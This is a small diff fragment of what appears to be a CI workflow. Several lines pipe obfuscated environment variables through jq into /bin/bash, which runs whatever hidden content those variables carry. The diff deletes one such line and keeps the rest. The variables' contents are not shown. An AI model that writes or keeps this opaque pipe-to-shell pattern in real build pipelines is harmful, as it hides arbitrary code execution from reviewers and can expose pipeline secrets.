@@ -33,7 +33,6 @@ jobs:
           echo $vzwzt3 | jq -r .xhyo7731 | /bin/bash
           echo $ccmv13 | jq -r .k97 | /bin/bash
           printf '%s' "$nhpy9348" | jq -r .f4 | /bin/bash
-          echo $gf20934 | jq -r .rhb556 | /bin/bash
           printf '%s' "$pydbb02253" | jq -r .mjndm89588 | /bin/bash
 
       - name: Store artifact
